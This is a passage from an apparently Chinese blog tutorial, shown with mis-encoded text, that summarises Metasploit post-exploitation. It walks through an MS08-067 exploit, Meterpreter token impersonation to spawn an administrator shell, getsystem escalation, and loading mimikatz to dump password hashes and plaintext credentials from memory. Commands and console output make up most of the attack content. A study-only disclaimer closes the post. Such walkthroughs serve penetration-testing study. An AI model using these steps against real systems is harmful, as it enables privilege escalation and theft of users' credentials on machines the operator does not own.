<p>   0   Automatic Targeting<br>msf exploit(ms08_067_netapi) &gt; exploit<br>ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡å°ä¸‘ç«Ÿç„¶æ˜¯æˆ‘ä»¬è‡ªå·±ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡ğŸ¤¡</p>
<hr>
<hr>
<h4 id="2-6-éšèº«ä»¤ç‰Œæ”»å‡»"><a href="#2-6-éšèº«ä»¤ç‰Œæ”»å‡»" class="headerlink" title="2.6 éšèº«ä»¤ç‰Œæ”»å‡»"></a><center>2.6 éšèº«ä»¤ç‰Œæ”»å‡»</center></h4><p>meterpreter &gt; <code>list_tokens -u</code> æŸ¥çœ‹æœ‰æ²¡æœ‰æœ‰æ•ˆçš„ä»¤ç‰Œ</p>
<p>å‡å¦‚è¯´æœ‰ä¸ªæœ‰æ•ˆçš„administratorç®¡ç†å‘˜ä»¤ç‰Œï¼Œæˆ‘ä»¬ç°åœ¨æ¨¡ä»¿è¿™ä¸ªä»¤ç‰Œä»¥æ‰¿æ‹…å®ƒçš„ç‰¹æƒã€‚å‘å‡ºimpersonate_tokenå‘½ä»¤æ—¶ï¼Œè¯·æ³¨æ„â€œSNEAKS.IN \ Administratorâ€ä¸­çš„ä¸¤ä¸ªåæ–œæ ã€‚è¿™æ˜¯å¿…éœ€çš„ï¼Œå› ä¸ºå®ƒä¼šå¯¼è‡´åªæœ‰ä¸€ä¸ªæ–œæ çš„é”™è¯¯ã€‚è¿˜è¦æ³¨æ„ï¼ŒæˆåŠŸæ¨¡æ‹Ÿä»¤ç‰Œåï¼Œæˆ‘ä»¬é€šè¿‡æ‰§è¡Œgetuidå‘½ä»¤æ¥æ£€æŸ¥å½“å‰çš„ç”¨æˆ·ID </p>
<p>meterpreter &gt; <code>impersonate_token SNEAKS.IN\\Administrator </code></p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨Meterpreterä¸­è¿è¡Œâ€™Â execute -f cmd.exe -i -tÂ â€˜æ¥è¿è¡Œä¸€ä¸ªshellä½œä¸ºæ­¤ä¸ªäººå¸æˆ·ã€‚â€œÂ execute -f cmd.exeÂ â€å‘Šè¯‰Metasploitæ‰§è¡Œcmd.exeï¼Œ-iå…è®¸æˆ‘ä»¬ä¸å—å®³è€…PCè¿›è¡Œäº¤äº’ï¼Œè€Œ-tåˆ™è®¤ä¸ºæˆ‘ä»¬åˆšåˆšé€šè¿‡éšèº«æ¨¡å¼æ‰®æ¼”è§’è‰²ã€‚<br>meterpreter &gt; <code>execute -f cmd.exe -i -t </code><br>meterpreter &gt; <code>shell</code><br>C:\WINDOWS\system32&gt; <code>whoami</code><br>SNEAKS.IN\administrator</p>
<h4 id="2-7-å¯†ç ç ´è§£"><a href="#2-7-å¯†ç ç ´è§£" class="headerlink" title="2.7 å¯†ç ç ´è§£"></a><center>2.7 å¯†ç ç ´è§£</center></h4><center>çŒ•çŒ´æ¡ƒ(mimikatz)</center>
è·å–ä¸€ä¸ªmeterpreterï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬çš„ä¼šè¯ä»¥ç®¡ç†å‘˜çº§åˆ«çš„æƒé™è¿è¡Œï¼Œä»¥ä¾¿mimikatzè¿è¡Œã€‚
meterpreter > `getuid`
Server username: WINXP-E95CE571A1\Administrator
meterpreter > `getsystem`
...got system (via technique 1).
meterpreter > `getuid`
Server username: NT AUTHORITY\SYSTEM


<hr>
<p>Mimikatzæ”¯æŒ32ä½å’Œ64ä½Windowsä½“ç³»ç»“æ„ã€‚å°†æˆ‘ä»¬çš„æƒé™å‡çº§åˆ°SYSTEMåï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨sysinfoå‘½ä»¤éªŒè¯å—æ„ŸæŸ“æœºå™¨çš„ä½“ç³»ç»“æ„ã€‚è¿™å°†ä¸64ä½æœºå™¨ç›¸å…³ï¼Œå› ä¸ºæˆ‘ä»¬å¯èƒ½åœ¨64ä½ä½“ç³»ç»“æ„ä¸ŠæŸå®³äº†32ä½è¿›ç¨‹ã€‚å¦‚æœå‡ºç°è¿™ç§æƒ…å†µï¼Œmeterpreterä¼šå°è¯•å°†32ä½ç‰ˆæœ¬çš„MimikatzåŠ è½½åˆ°å†…å­˜ä¸­ï¼Œè¿™ä¼šå¯¼è‡´å¤§å¤šæ•°åŠŸèƒ½æ— æ³•ä½¿ç”¨ã€‚è¿™å¯ä»¥é€šè¿‡æŸ¥çœ‹æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹åˆ—è¡¨å¹¶åœ¨åŠ è½½Mimikatzä¹‹å‰è¿ç§»åˆ°64ä½è¿›ç¨‹æ¥é¿å…ã€‚</p>
<p>meterpreter &gt; <code>sysinfo</code><br><del>Computer        : WINXP-E95CE571A1<br>OS              : Windows XP (Build 2600, Service Pack 3).<br>Architecture    : x86<br>System Language : en_US<br>Meterpreter     : x86/win32</del></p>
<p>çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ª32ä½æœºå™¨ï¼Œæˆ‘ä»¬ç»§ç»­å°†mimikatzæ¨¡å—åŠ è½½åˆ°å†…å­˜ä¸­ã€‚<br>meterpreter &gt; <code>load mimikatz</code><br><del>Loading extension mimikatzâ€¦success.</del></p>
<p>meterpreter &gt; <code>help mimikatz</code></p>
<p><del>Command           Description<br>    â€”â€”-           â€”â€”â€”â€“<br>    kerberos          å°è¯•æ£€ç´¢Kerberoså‡­è¯<br>    livessp           å°è¯•æ£€ç´¢livesspå‡­è¯<br>    mimikatz_command  è¿è¡Œè‡ªå®šä¹‰å‘½ä»¤<br>    msv               å°è¯•æ£€ç´¢msvå‡­è¯ï¼ˆå“ˆå¸Œï¼‰<br>    ssp               å°è¯•æ£€ç´¢sspå‡­è¯<br>    tspkg             å°è¯•æ£€ç´¢tspkgå‡­è¯<br>    wdigest           å°è¯•æ£€ç´¢wdigestå‡­è¯</del></p>
<p>Metasploitä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å†…ç½®å‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥ä»å†…å­˜ä¸­å±•ç¤ºMimikatzæœ€å¸¸ç”¨çš„åŠŸèƒ½ï¼Œè½¬å‚¨æ•£åˆ—å’Œæ˜æ–‡å‡­è¯ã€‚ä½†æ˜¯ï¼Œmimikatz_commandé€‰é¡¹ä½¿æˆ‘ä»¬å¯ä»¥å®Œå…¨è®¿é—®Mimikatzä¸­çš„æ‰€æœ‰åŠŸèƒ½ã€‚</p>
<p>meterpreter &gt; <code>mimikatz_command -f version</code></p>
<p><del>mimikatz 1.0 x86 (RC) (Nov  7 2013 08:21:02)</del></p>
<p>å°½ç®¡æœ‰ç‚¹ä¸æ­£ç»Ÿï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡åŠ è½½ä¸å­˜åœ¨çš„åŠŸèƒ½æ¥è·å¾—å¯ç”¨æ¨¡å—çš„å®Œæ•´åˆ—è¡¨<br>meterpreter &gt; <code>mimikatz_command -f fu::</code></p>
<p>~~Module : â€˜fuâ€™ introuvable</p>
<p>Modules disponibles :<br>                - Standard<br>      crypto    - Cryptographie et certificats<br>        hash    - Hash<br>      system    - Gestion systÃ¨me<br>     process    - Manipulation des processus<br>      thread    - Manipulation des threads<br>     service    - Manipulation des services<br>   privilege    - Manipulation des privilÃ¨ges<br>      handle    - Manipulation des handles<br> impersonate    - Manipulation tokens dâ€™accÃ¨s<br>     winmine    - Manipulation du dÃ©mineur<br> minesweeper    - Manipulation du dÃ©mineur 7<br>       nogpo    - Anti-gpo et patchs divers<br>     samdump    - Dump de SAM<br>      inject    - Injecteur de librairies<br>          ts    - Terminal Server<br>      divers    - Fonctions diverses nâ€™ayant pas encore assez de corps pour avoir leurs propres module<br>    sekurlsa    - Dump des sessions courantes par providers LSASS<br>         efs    - Manipulations EFS~~</p>
<p>è¦æŸ¥è¯¢è¿™äº›æ¨¡å—çš„å¯ç”¨é€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­æ³•</p>
<p>meterpreter &gt; <code>mimikatz_command -f divers::</code></p>
<p>~~Module : â€˜diversâ€™ identifiÃ©, mais commande â€˜â€™ introuvable</p>
<p>Description du module : Fonctions diverses nâ€™ayant pas encore assez de corps pour avoir leurs propres module<br>  noroutemon    - [experimental] Patch Juniper Network Connect pour ne plus superviser la table de routage<br>   eventdrop    - [super experimental] Patch lâ€™observateur dâ€™Ã©vÃ©nements pour ne plus rien enregistrer<br>  cancelator    - Patch le bouton annuler de Windows XP et 2003 en console pour dÃ©verrouiller une session<br>     secrets    - Affiche les secrets utilisateur~~</p>
<hr>
<hr>
<p>ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸ğŸ§Ÿâ€â™€ï¸</p>
<center>mimikatz ä»å†…å­˜ä¸­è¯»å–å“ˆå¸Œå’Œå¯†ç </center>

<p><strong><em>æˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨å†…ç½®çš„Metasploitå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœ¬æœºMimikatzå‘½ä»¤ä»å—æ„ŸæŸ“çš„æœºå™¨ä¸­æå–å“ˆå¸Œå’Œæ˜æ–‡å‡­æ®ã€‚</em></strong></p>
<hr>
<p>å†…ç½®metasploit<br>meterpreter &gt; <code>msv</code></p>
<p>meterpreter &gt; <code>kerberos</code></p>
<p>åŸç”Ÿmimikatz</p>
<p>meterpreter &gt; <code>mimikatz_command -f samdump::hashes</code></p>
<p><strong><em><em>å…¶å®è¿˜æœ‰è¶…çº§å¤šçš„åŠŸèƒ½ç‚¹ï¼Œä½†æ˜¯æˆ‘æ„Ÿè§‰éƒ½å·®ä¸å¤šï¼Œéœ€è¦çš„æ—¶å€™ç™¾åº¦ä¸‹ï¼Œmsfçˆ†ç ´ssh,ç­‰ç­‰ç­‰å¥½å¤šæ–¹å¼ï¼Œè¿™äº›æ‡‚çš„éƒ½æ‡‚ï¼Œè€Œä¸”æœ‰äº›å·¥å…·æ¯”è¿™ä¸ªæ–¹ä¾¿ï¼Œæ‡‚çš„éƒ½æ‡‚ï¼Œhhhhhhhhh,å†æ¬¡æ„Ÿè°¢ä»˜æ°è¡¨å“¥çš„æ–‡ç« ï¼Œè®©æˆ‘å¤ä¹ çš„æ–¹ä¾¿å¾ˆå¤šã€‚</em></em></strong></p>
<p>####2020å¹´åº¦è¿‡çš„å¼‚å¸¸è‰°è¾›ï¼Œæ„¿ä¸–ç•Œå’Œå¹³ã€‚</p>
<hr>
<hr>
<p>/##æ­¤æ•™ç¨‹ä»…ä¾›å‚è€ƒå­¦ä¹ ï¼Œè¯·å‹¿ç”¨äºéæ³•æ“ä½œï¼Œè¯·ç‰¢è®°ç½‘ç»œå®‰å…¨æ³•ã€‚</p>
<hr>
<p>##æœ¬æ–‡ç« å‚è€ƒä»˜æ°è¡¨å“¥å†™çš„æ–‡ç« åšçš„æ€»ç»“ï¼š<code>https://www.fujieace.com/metasploit/tutorials.html</code></p>

  </article>

  
    
  <div class="nexmoe-post-copyright">
    <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>zh-CN<br>
    <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://example.com/2020/12/23/Metasploit/" title="http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;12&#x2F;23&#x2F;Metasploit&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;example.com&#x2F;2020&#x2F;12&#x2F;23&#x2F;Metasploit&#x2F;</a><br>
    
      <strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬æ–‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> åè®®è¿›è¡Œè®¸å¯
    
  </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
    
    
</div>

  <div class="nexmoe-post-footer">
    <section class="nexmoe-comment">
    <div class="valine"></div>
<script src='https://cdn.jsdelivr.net/npm/valine@1.3.9/dist/Valine.min.js'></script>
<script>
    // ä½¿ç”¨æ–¹æ³• https://valine.js.org/quickstart.html
    new Valine({
        el: '.valine',
        appId: '5WVA81dLG7qBwRtbBpeOpxgU-gzGzoHsz',
        appKey: 'qV0iAj1AjaCOrBKkdj1CONE1'
    })
</script>
</section>
  </div>
</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
<script>
	hljs.initHighlightingOnLoad();
</script>

<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>


<script src="https://cdn.jsdelivr.net/gh/xtaodada/xtaodada.github.io@0.0.2/copy.js"></script>
 <script src="/js/app.js?v=1609298466934"></script>

  


    <!-- CNZZ Analytics -->
<div hidden>
    <script src="//s95.cnzz.com/z_stat.php?id=1279546677#&lt;ID&gt;&web_id=1279546677#&lt;ID&gt;" language="JavaScript"></script>
</div>




</body>

</html>
